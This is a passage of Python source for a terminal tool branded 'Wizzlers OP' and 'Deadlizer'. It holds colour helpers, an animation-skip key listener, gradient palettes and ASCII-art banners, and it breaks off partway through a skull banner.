import sys
import math
import asyncio
import httpx
import websockets
from itertools import cycle
from collections import deque
import random
import json
import os
import webbrowser
import base64
from datetime import datetime, timedelta
import time
try:
    import pyperclip as _pyperclip
except ImportError:
    _pyperclip = None

def _clipboard_copy(text):
    """Cross-platform clipboard copy. Silently fails if unavailable."""
    if _pyperclip is not None:
        try:
            _pyperclip.copy(text)
            return True
        except Exception:
            pass
    return False
import threading

VERSION = '2.1.4'

def hsv_to_rgb(h, s, v):
    h = float(h) % 360
    s = float(s)
    v = float(v)
    c = v * s
    x = c * (1 - abs((h / 60.0) % 2 - 1))
    m = v - c
    if h < 60: r, g, b = c, x, 0
    elif h < 120: r, g, b = x, c, 0
    elif h < 180: r, g, b = 0, c, x
    elif h < 240: r, g, b = 0, x, c
    elif h < 300: r, g, b = x, 0, c
    else: r, g, b = c, 0, x
    return (int((r + m) * 255), int((g + m) * 255), int((b + m) * 255))



class _AnimationSkipper:
    def __init__(self, required_presses=2):
        self.required = required_presses
        self.count = 0
        self.skipped = False
        self._thread = None
        self._stop = False

    def start(self):
        self._stop = False
        self.skipped = False
        self.count = 0
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()

    def _listen(self):
        try:
            if os.name == 'nt':
                import msvcrt
                while not self._stop and not self.skipped:
                    if msvcrt.kbhit():
                        key = msvcrt.getwch()
                        if key in ('\r', '\n'):
                            self.count += 1
                            if self.count >= self.required:
                                self.skipped = True
                                return
                    else:
                        time.sleep(0.05)
            else:
                import select
                import sys as _sys
                while not self._stop and not self.skipped:
                    if select.select([_sys.stdin], [], [], 0.05)[0]:
                        _sys.stdin.readline()
                        self.count += 1
                        if self.count >= self.required:
                            self.skipped = True
                            return
        except Exception:
            pass

    def stop(self):
        self._stop = True

    @property
    def should_skip(self):
        return self.skipped

__mode__ = None
__manual_mode__ = False


ALL_GRADIENTS = [
    ((0, 255, 255), (255, 0, 255)),   # Cyan to Magenta
    ((128, 0, 128), (255, 215, 0)),  # Purple to Gold
    ((0, 255, 0), (173, 255, 47)),   # Green to GreenYellow
    ((255, 0, 0), (255, 165, 0)),    # Red to Orange
    ((0, 0, 255), (255, 255, 255)),  # Blue to White
    ((255, 105, 180), (255, 255, 0)),# HotPink to Yellow
    ((255, 0, 0), (255, 255, 255)),  # Red to White
    ((180, 0, 255), (0, 255, 255)),  # Electric Purple to Cyan
    ((255, 20, 147), (139, 0, 0)),   # Deep Pink to Dark Red
    ((255, 0, 255), (148, 0, 211)),  # Magenta to DarkViolet
    ((255, 64, 64), (64, 64, 255)),  # Soft Red to Soft Blue
    ((0, 242, 255), (180, 40, 255)), # Sky Blue to Royal Purple
    ((255, 183, 77), (255, 82, 82)), # Peach to Coral
    ((100, 255, 218), (0, 188, 212)),# Aquamarine to Cyan
    ((255, 0, 100), (40, 0, 255)),   # Neon Rose to Electric Blue
    ((255, 255, 0), (255, 0, 0)),    # Yellow to Red
    ((224, 64, 251), (0, 229, 255)), # Purple to Light Blue
    ((118, 255, 3), (0, 229, 255)),  # Lime to Cyan
    ((255, 234, 0), (255, 0, 255)),  # Vivid Yellow to Magenta
    ((0, 255, 127), (0, 128, 128)),  # Spring Green to Teal
    ((255, 111, 0), (255, 255, 255)),# Deep Orange to White
    ((64, 224, 208), (255, 127, 80)),# Turquoise to Coral
    ((255, 105, 180), (75, 0, 130)), # Pink to Indigo
    ((0, 191, 255), (0, 0, 128)),    # Deep Sky Blue to Navy
    ((255, 215, 0), (40, 40, 40)),   # Gold to Dark Grey
    ((173, 216, 230), (25, 25, 112)),# Light Blue to Midnight Blue
    ((255, 69, 0), (255, 215, 0)),   # OrangeRed to Gold
    ((124, 252, 0), (0, 100, 0)),    # LawnGreen to DarkGreen
    ((147, 112, 219), (75, 0, 130)), # Medium Purple to Indigo
    ((240, 128, 128), (139, 0, 0)),  # Light Coral to Dark Red
    ((0, 255, 255), (0, 128, 255)),  # Cyan to Azure
    ((255, 20, 147), (255, 160, 122)),# DeepPink to LightSalmon
    ((0, 250, 154), (70, 130, 180)), # MediumSpringGreen to SteelBlue
    ((255, 0, 0), (0, 0, 255)),      # Red to Blue
    ((255, 140, 0), (153, 50, 204)), # DarkOrange to DarkOrchid
    ((172, 255, 47), (0, 191, 255)), # GreenYellow to DeepSkyBlue
    ((255, 20, 147), (0, 255, 127)), # DeepPink to SpringGreen
    ((135, 206, 235), (255, 182, 193)),# SkyBlue to LightPink
    ((255, 215, 0), (255, 69, 0)),   # Gold to OrangeRed
    ((0, 255, 255), (0, 0, 139)),    # Cyan to DarkBlue
    ((255, 0, 255), (75, 0, 130)),   # Magenta to Indigo
    ((0, 255, 127), (25, 25, 112)),  # SpringGreen to MidnightBlue
    ((255, 255, 240), (255, 140, 0)),# Ivory to DarkOrange
    ((255, 20, 147), (255, 255, 0)), # DeepPink to Yellow
    ((0, 206, 209), (138, 43, 226)), # DarkTurquoise to BlueViolet
    ((255, 165, 0), (0, 0, 255)),    # Orange to Blue
    ((0, 255, 0), (255, 20, 147)),   # Green to DeepPink
    ((255, 255, 255), (105, 105, 105)),# White to DimGrey
    ((255, 255, 0), (0, 0, 128)),    # Yellow to Navy
    ((30, 144, 255), (255, 20, 147)), # DodgerBlue to DeepPink
    ((255, 0, 0), (0, 255, 0)),      # Red to Green (Christmas/Toxic)
    ((135, 206, 250), (25, 25, 112)),# LightSkyBlue to MidnightBlue
    ((218, 112, 214), (0, 0, 255)),  # Orchid to Blue
    ((255, 20, 147), (124, 252, 0)), # DeepPink to LawnGreen
    ((0, 255, 255), (255, 215, 0)),  # Cyan to Gold
    ((255, 69, 0), (0, 255, 127)),   # OrangeRed to SpringGreen
    ((255, 105, 180), (0, 191, 255)),# HotPink to DeepSkyBlue
    ((255, 255, 0), (128, 0, 128)),   # Yellow to Purple
    ((255, 105, 180), (75, 0, 130)), # HotPink to Indigo
    ((255, 0, 0), (255, 255, 0)),    # Red to Yellow
    ((0, 255, 0), (0, 0, 255)),      # Green to Blue
    ((255, 255, 255), (255, 105, 180)),# White to HotPink
    ((255, 20, 147), (0, 206, 209)), # DeepPink to DarkTurquoise
    ((124, 252, 0), (139, 0, 0)),    # LawnGreen to DarkRed
    ((0, 191, 255), (255, 69, 0)),   # DeepSkyBlue to OrangeRed
    ((255, 215, 0), (0, 0, 128)),    # Gold to Navy
    ((186, 85, 211), (0, 255, 127)), # MediumOrchid to SpringGreen
    ((255, 140, 0), (30, 144, 255)), # DarkOrange to DodgerBlue
    ((0, 250, 154), (138, 43, 226)), # MediumSpringGreen to BlueViolet
    ((255, 0, 255), (255, 255, 0)),  # Magenta to Yellow
    ((0, 255, 255), (255, 0, 0)),    # Cyan to Red
    ((255, 165, 0), (0, 0, 255)),    # Orange to Blue
    ((0, 128, 0), (255, 192, 203)),  # Green to Pink
    ((128, 0, 128), (255, 255, 255)),# Purple to White
    ((0, 255, 0), (255, 20, 147)),   # Green to DeepPink
    ((0, 0, 255), (255, 255, 0)),    # Blue to Yellow
    ((255, 69, 0), (0, 255, 255)),   # OrangeRed to Cyan
    ((139, 0, 139), (127, 255, 0)),  # DarkMagenta to Chartreuse
    ((255, 105, 180), (0, 0, 128)),  # HotPink to Navy
    ((0, 255, 127), (255, 215, 0)),  # SpringGreen to Gold
    ((75, 0, 130), (255, 255, 255)), # Indigo to White
    ((30, 144, 255), (255, 20, 147)),# DodgerBlue to DeepPink
    ((124, 252, 0), (138, 43, 226)), # LawnGreen to BlueViolet
    ((0, 255, 255), (255, 165, 0)),  # Cyan to Orange
    ((255, 0, 255), (0, 128, 0)),    # Magenta to Green
    ((139, 0, 0), (0, 255, 0)),      # DarkRed to Green
    ((0, 191, 255), (255, 0, 255)),  # DeepSkyBlue to Magenta
    ((255, 255, 0), (0, 0, 255)),    # Yellow to Blue
]

def pick_random_gradient():
    return random.choice(ALL_GRADIENTS)

W_START, W_END = pick_random_gradient()
WIZZLER_ASCII_ALT_4 = [
    " __   __  ___   __   ________  ________   ___       _______   _______    ________         ______    _______   ",
    "|\"  |/  \\|  \"| |\" \\ (\"      \"\\(\"      \"\\ |\"  |     /\"     \"| /\"      \\  /\"       )       /    \" \\  |   __ \"\\  ",
    "|'  /    \\:  | ||  | \\___/   :)\\___/   :)||  |    (: ______)|:        |(:   \\___/       // ____  \\ (. |__) :) ",
    "|: /'        | |:  |   /  ___/   /  ___/ |:  |     \\/    |  |_____/   ) \\___  \\        /  /    ) :)|:  ____/  ",
    " \\//  /\\'    | |.  |  //  \\__   //  \\__   \\  |___  // ___)_  //      /   __/  \\\\      (: (____/ // (|  /      ",
    " /   /  \\\\   | /\\  |\\(:   / \"\\ (:   / \"\\ ( \\_|:  \\(:      \"||:  __   \\  /\" \\   :)      \\        / /|__/ \\     ",
    "|___/    \\___|(__\\_|_)\\_______) \\_______) \\_______)\\_______)|__|  \\___)(_______/        \\\"_____/ (_______)    ",
]
WIZZLER_START = W_START
WIZZLER_END = W_END

D_START, D_END = pick_random_gradient()
DEADLIZER_START = D_START
DEADLIZER_END = D_END

SUCCESS_GRADIENTS = [
    ((0, 255, 150), (0, 60, 20)),   # Deep Mint to Jungle
    ((50, 255, 80), (0, 40, 10)),   # Electric Mint to Forest
    ((20, 255, 20), (0, 15, 0)),    # Viral Dark Neon Green
    ((127, 255, 0), (0, 100, 0)),   # Chartreuse to Dark Green
    ((0, 255, 127), (0, 128, 0)),   # Spring Green to Green
    ((173, 255, 47), (85, 107, 47)),# GreenYellow to DarkOliveGreen
    ((0, 255, 64), (0, 32, 0)),     # Bright green to Deep shadow
    ((64, 255, 208), (16, 64, 48)), # Turquoise Green to Dark Slate
    ((200, 255, 0), (20, 40, 0)),   # Lime Yellow to Dark Moss
    ((0, 255, 255), (0, 64, 64)),   # Cyan to Dark Teal
    ((152, 251, 152), (0, 100, 0)), # PaleGreen to DarkGreen
    ((0, 250, 154), (46, 139, 87)), # MediumSpringGreen to SeaGreen
    ((144, 238, 144), (34, 139, 34)),# LightGreen to ForestGreen
    ((50, 205, 50), (0, 100, 0)),    # LimeGreen to DarkGreen
    ((0, 255, 0), (0, 40, 0)),       # Neon Green to Forest
    ((127, 255, 0), (20, 60, 20)),   # Chartreuse to Deep Green
    ((0, 255, 127), (0, 30, 0)),     # Spring Green to Abyss
    ((152, 251, 152), (0, 50, 0)),   # PaleGreen to Moss
    ((0, 250, 154), (0, 20, 10)),    # MediumSpringGreen to Shadow
    ((144, 238, 144), (20, 40, 20)), # LightGreen to Swamp
    ((0, 255, 64), (0, 10, 5)),      # Bright Green to Void
    ((64, 255, 208), (0, 32, 16)),   # Turquoise to Dark Teal
    ((200, 255, 0), (10, 20, 0)),    # Lime Yellow to Mud
]
S_START, S_END = random.choice(SUCCESS_GRADIENTS)
GREEN_START = S_START
GREEN_END = S_END
ERROR_GRADIENTS = [
    ((255, 0, 0), (20, 0, 0)),      # Red to Black
    ((255, 69, 0), (45, 0, 0)),     # Orange Red to Black
    ((255, 20, 147), (40, 0, 10)),  # Deep Pink to Dark Maroon
    ((139, 0, 0), (20, 0, 0)),      # Dark Red to Black
    ((255, 0, 255), (40, 0, 40)),   # Magenta to Dark Purple
    ((255, 48, 48), (64, 0, 0)),    # Firebrick to Shadow
    ((255, 127, 80), (80, 20, 0)),  # Coral to Burnt Umber
    ((255, 0, 127), (32, 0, 16)),   # Rose to Void
    ((255, 64, 0), (32, 8, 0)),     # Hot Orange to Pitch
    ((220, 20, 60), (40, 0, 0)),    # Crimson to Darkness
    ((255, 99, 71), (139, 0, 0)),   # Tomato to DarkRed
    ((250, 128, 114), (128, 0, 0)), # Salmon to Maroon
    ((255, 0, 0), (75, 0, 130)),    # Red to Indigo
    ((255, 0, 0), (30, 0, 0)),       # Pure Red to Blood
    ((220, 20, 60), (40, 0, 0)),     # Crimson to Dark
    ((178, 34, 34), (10, 0, 0)),     # Firebrick to Pit
    ((255, 69, 0), (20, 5, 0)),      # OrangeRed to Ash
    ((255, 20, 147), (40, 0, 20)),   # DeepPink to Night
    ((255, 127, 80), (30, 10, 0)),   # Coral to Burnt
    ((255, 0, 127), (40, 0, 40)),    # Rose to Shadow
    ((128, 0, 0), (60, 0, 0)),       # Maroon to Dark Maroon
]
E_START, E_END = random.choice(ERROR_GRADIENTS)
RED_START = E_START
RED_END = E_END
PINK_GRADIENTS = [
    ((255, 105, 180), (40, 0, 130)), # HotPink to Indigo
    ((255, 20, 147), (75, 0, 130)),  # DeepPink to Indigo
    ((218, 112, 214), (139, 0, 139)),# Orchid to DarkMagenta
    ((255, 182, 193), (199, 21, 133)),# LightPink to MediumVioletRed
    ((255, 0, 255), (25, 25, 112)),  # Magenta to MidnightBlue
    ((255, 105, 180), (20, 0, 40)),  # HotPink to Dark Purple
    ((218, 112, 214), (40, 0, 40)),  # Orchid to Void
    ((255, 192, 203), (128, 0, 128)),# Pink to Purple
    ((255, 182, 193), (75, 0, 130)), # LightPink to Indigo
]
P_START, P_END = random.choice(PINK_GRADIENTS)
PINK_START = P_START
PINK_END = P_END

WIZZLER_ASCII = [
    "██╗    ██╗██╗███████╗███████╗██╗     ███████╗██████╗ ███████╗     ██████╗ ██████╗ ",
    "██║    ██║██║╚══███╔╝╚══███╔╝██║     ██╔════╝██╔══██╗██╔════╝    ██╔═══██╗██╔══██╗",
    "██║ █╗ ██║██║  ███╔╝   ███╔╝ ██║     █████╗  ██████╔╝███████╗    ██║   ██║██████╔╝",
    "██║███╗██║██║ ███╔╝   ███╔╝  ██║     ██╔══╝  ██╔══██╗╚════██║    ██║   ██║██╔═══╝ ",
    "╚███╔███╔╝██║███████╗███████╗███████╗███████╗██║  ██║███████║    ╚██████╔╝██║     ",
    " ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═╝     ",
]

DEADLIZER_ASCII = [
    "  ██████╗ ███████╗ █████╗ ██████╗ ██╗     ██╗███████╗███████╗██████╗ ",
    "  ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║     ██║╚══███╔╝██╔════╝██╔══██╗",
    "  ██║  ██║█████╗  ███████║██║  ██║██║     ██║  ███╔╝ █████╗  ██████╔╝",
    "  ██║  ██║██╔══╝  ██╔══██║██║  ██║██║     ██║ ███╔╝  ██╔══╝  ██╔══██╗",
    "  ██████╔╝███████╗██║  ██║██████╔╝███████╗██║███████╗███████╗██║  ██║",
    "  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝",
]

WIZZLER_ASCII_ALT_1 = [
    "█     █░ ██▓▒███████▒▒███████▒ ██▓    ▓█████  ██▀███    ██████     ▒█████   ██▓███  ",
    "▓█░ █ ░█░▓██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░▓██▒    ▓█   ▀ ▓██ ▒ ██▒▒██    ▒    ▒██▒  ██▒▓██░  ██▒",
    "▒█░ █ ░█ ▒██▒░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ ▒██░    ▒███   ▓██ ░▄█ ▒░ ▓██▄      ▒██░  ██▒▓██░ ██▓▒",
    "░█░ █ ░█ ░██░  ▄▀▒   ░  ▄▀▒   ░▒██░    ▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒   ▒██   ██░▒██▄█▓▒ ▒",
    "░░██▒██▓ ░██░▒███████▒▒███████▒░██████▒░▒████▒░██▓ ▒██▒▒██████▒▒   ░ ████▓▒░▒██▒ ░  ░",
    "░ ▓░▒ ▒  ░▓  ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░",
    "  ▒ ░ ░   ▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░     ░ ▒ ▒░ ░▒ ░     ",
    "  ░   ░   ▒ ░░ ░ ░ ░ ░░ ░ ░ ░ ░  ░ ░      ░     ░░   ░ ░  ░  ░     ░ ░ ░ ▒  ░░       ",
    "    ░     ░    ░ ░      ░ ░        ░  ░   ░  ░   ░           ░         ░ ░           ",
]

WIZZLER_ASCII_ALT_2 = [
    " _       ________________   __    __________  _____    ____  ____ ",
    "| |     / /  _/__  /__  /  / /   / ____/ __ \/ ___/   / __ \/ __ \ ",
    "| | /| / // /   / /  / /  / /   / __/ / /_/ /\\__ \\   / / / / /_/ / ",
    "| |/ |/ // /   / /__/ /__/ /___/ /___/ _, _/___/ /  / /_/ / ____/  ",
    "|__/|__/___/  /____/____/_____/_____/_/ |_|/____/   \\____/_/       ",
]

WIZZLER_ASCII_ALT_3 = [
    " █████   ███   █████ █████ ███████████ ███████████ █████       ██████████ ███████████    █████████        ███████    ███████████ ",
    "▒▒███   ▒███  ▒▒███ ▒▒███ ▒█▒▒▒▒▒▒███ ▒█▒▒▒▒▒▒███ ▒▒███       ▒▒███▒▒▒▒▒█▒▒███▒▒▒▒▒███  ███▒▒▒▒▒███     ███▒▒▒▒▒███ ▒▒███▒▒▒▒▒███",
    " ▒███   ▒███   ▒███  ▒███ ▒     ███▒  ▒     ███▒   ▒███        ▒███  █ ▒  ▒███    ▒███ ▒███    ▒▒▒     ███     ▒▒███ ▒███    ▒███",
    " ▒███   ▒███   ▒███  ▒███      ███         ███     ▒███        ▒██████    ▒██████████  ▒▒█████████    ▒███      ▒███ ▒██████████ ",
    " ▒▒███  █████  ███   ▒███     ███         ███      ▒███        ▒███▒▒█    ▒███▒▒▒▒▒███  ▒▒▒▒▒▒▒▒███   ▒███      ▒███ ▒███▒▒▒▒▒▒  ",
    "  ▒▒▒█████▒█████▒    ▒███   ████     █  ████     █ ▒███      █ ▒███ ▒   █ ▒███    ▒███  ███    ▒███   ▒▒███     ███  ▒███        ",
    "    ▒▒███ ▒▒███      █████ ███████████ ███████████ ███████████ ██████████ █████   █████▒▒█████████     ▒▒▒███████▒   █████       ",
    "     ▒▒▒   ▒▒▒      ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒        ▒▒▒▒▒▒▒    ▒▒▒▒▒        ",
]


DEADLIZER_ASCII_ALT_2 = [
    "▓█████▄ ▓█████ ▄▄▄      ▓█████▄  ██▓     ██▓▒███████▒▓█████  ██▀███  ",
    "▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌▓██▒    ▓██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒",
    "░██   █▌▒███  ▒██  ▀█▄  ░██   █▌▒██░    ▒██▒░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒",
    "░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌▒██░    ░██░  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ",
    "░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓ ░██████▒░██░▒███████▒░▒████▒░██▓ ▒██▒",
    " ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▓  ░░▓  ░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░",
    " ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒ ░ ░ ▒  ░ ▒ ░░░▒ ▒ ░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░",
    " ░ ░  ░    ░    ░   ▒    ░ ░  ░   ░ ░    ▒ ░░ ░ ░ ░ ░   ░     ░░   ░ ",
    "   ░       ░  ░     ░  ░   ░        ░  ░ ░    ░ ░       ░  ░   ░     ",
    " ░                       ░                  ░                        ",
]

DEADLIZER_ASCII_ALT_3 = [
    "    ____  _________    ____  __    _________   __________ ",
    "   / __ \\/ ____/   |  / __ \\/ /   /  _/__  /  / ____/ __ \\ ",
    "  / / / / __/ / /| | / / / / /    / /   / /  / __/ / /_/ / ",
    " / /_/ / /___/ ___ |/ /_/ / /____/ /   / /__/ /___/ _, _/  ",
    "/_____/_____/_/  |_/_____/_____/___/  /____/_____/_/ |_|   ",
]

DEADLIZER_ASCII_ALT_4 = [
    " ██████████   ██████████   █████████   ██████████   █████       █████ ███████████ ██████████ ███████████  ",
    "▒▒███▒▒▒▒███ ▒▒███▒▒▒▒▒█  ███▒▒▒▒▒███ ▒▒███▒▒▒▒███ ▒▒███       ▒▒███ ▒█▒▒▒▒▒▒███ ▒▒███▒▒▒▒▒█▒▒███▒▒▒▒▒███ ",
    " ▒███   ▒▒███ ▒███  █ ▒  ▒███    ▒███  ▒███   ▒▒███ ▒███        ▒███ ▒     ███▒   ▒███  █ ▒  ▒███    ▒███ ",
    " ▒███    ▒███ ▒██████    ▒███████████  ▒███    ▒███ ▒███        ▒███      ███     ▒██████    ▒██████████  ",
    " ▒███    ▒███ ▒███▒▒█    ▒███▒▒▒▒▒███  ▒███    ▒███ ▒███        ▒███     ███      ▒███▒▒█    ▒███▒▒▒▒▒███ ",
    " ▒███    ███  ▒███ ▒   █ ▒███    ▒███  ▒███    ███  ▒███      █ ▒███   ████     █ ▒███ ▒   █ ▒███    ▒███ ",
    " ██████████   ██████████ █████   █████ ██████████   ███████████ █████ ███████████ ██████████ █████   █████",
    "▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒ ",
]


FORDEADLIZER_ASCII_ALT_5 = [
    " ________    _______       __       ________   ___        __   ________    _______   _______   ",
    "|\"      \"\\  /\"     \"|     /\"\"\\     |\"      \"\\ |\"  |      |\" \\ (\"      \"\\  /\"     \"| /\"      \\  ",
    "(.  ___  :)(: ______)    /    \\    (.  ___  :)||  |      ||  | \\___/   :)(: ______)|:        | ",
    "|: \\   ) || \\/    |     /' /\\  \\   |: \\   ) |||:  |      |:  |   /  ___/  \\/    |  |_____/   ) ",
    "(| (___\\ || // ___)_   //  __'  \\  (| (___\\ || \\  |___   |.  |  //  \\__   // ___)_  //      /  ",
    "|:       :)(:      \"| /   /  \\\\  \\ |:       :)( \\_|:  \\  /\\  |\\(:   / \"\\ (:      \"||:  __   \\  ",
    "(________/  \\_______)(___/    \\___)(________/  \\_______)(__\\_|_)\\_______) \\_______)|__|  \\___) ",
]

WIZZLER_ASCII_STYLES = [WIZZLER_ASCII, WIZZLER_ASCII_ALT_1, WIZZLER_ASCII_ALT_2, WIZZLER_ASCII_ALT_3, WIZZLER_ASCII_ALT_4]
DEADLIZER_ASCII_STYLES = [DEADLIZER_ASCII, DEADLIZER_ASCII_ALT_2, DEADLIZER_ASCII_ALT_3, DEADLIZER_ASCII_ALT_4, FORDEADLIZER_ASCII_ALT_5]

STARTUP_BANNER = [
  "                             __xxxxxxxxxxxxxxxx___.",
  "                        _gxXXXXXXXXXXXXXXXXXXXXXXXX!x_",
  "                   __x!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!x_",
  "                ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx_",
  "              ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!_",
  "            _!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.",
  "          gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXs",
  "        ,!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.",
  "       g!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "      iXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "     ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx",
  "     !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx",
  "   ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx",
  "   !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXi",
  "  dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "  !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "   XXXXXXXXXXXXXXXXXXXf~~~VXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvvvvXXXXXXXXXXXXXX!",
  "   !XXXXXXXXXXXXXXXf`       'XXXXXXXXXXXXXXXXXXXXXXf`          '~XXXXXXXXXXP",
  "    vXXXXXXXXXXXX!            !XXXXXXXXXXXXXXXXXX!              !XXXXXXXXX",
  "     XXXXXXXXXXv`              'VXXXXXXXXXXXXXXX                !XXXXXXXX!",
  "     !XXXXXXXXX.                 YXXXXXXXXXXXXX!                XXXXXXXXX",
  "      XXXXXXXXX!                 ,XXXXXXXXXXXXXX                VXXXXXXX!",
  "      'XXXXXXXX!                ,!XXXX ~~XXXXXXX               iXXXXXX~",
  "       'XXXXXXXX               ,XXXXXX   XXXXXXXX!             xXXXXXX!",
  "        !XXXXXXX!xxxxxxs______xXXXXXXX   'YXXXXXX!          ,xXXXXXXXX",
  "         YXXXXXXXXXXXXXXXXXXXXXXXXXXX`    VXXXXXXX!s. __gxx!XXXXXXXXXP",
  "          XXXXXXXXXXXXXXXXXXXXXXXXXX!      'XXXXXXXXXXXXXXXXXXXXXXXXX!",
  "          XXXXXXXXXXXXXXXXXXXXXXXXXP        'YXXXXXXXXXXXXXXXXXXXXXXX!",
  "          XXXXXXXXXXXXXXXXXXXXXXXX!     i    !XXXXXXXXXXXXXXXXXXXXXXXX",
  "          XXXXXXXXXXXXXXXXXXXXXXXX!     XX   !XXXXXXXXXXXXXXXXXXXXXXXX",
  "          XXXXXXXXXXXXXXXXXXXXXXXXx_   iXX_,_dXXXXXXXXXXXXXXXXXXXXXXXX",
  "          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXP",
  "          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!",
  "           ~vXvvvvXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf",
  "                    'VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvv~",
  "                      'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~",
  "                  _    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`",
  "                 -XX!  !XXXXXXX~XXXXXXXXXXXXXXXXXXXXXX~   Xxi",
  "                  YXX  '~ XXXXX XXXXXXXXXXXXXXXXXXXX`     iXX`",
  "                  !XX!    !XXX` XXXXXXXXXXXXXXXXXXXX      !XX",
  "                  !XXX    '~Vf  YXXXXXXXXXXXXXP YXXX     !XXX",
  "                  !XXX  ,_      !XXP YXXXfXXXX!  XXX     XXXV",
  "                  !XXX !XX           'XXP 'YXX!       ,.!XXX!",
  "                  !XXXi!XP  XX.                  ,_  !XXXXXX!",
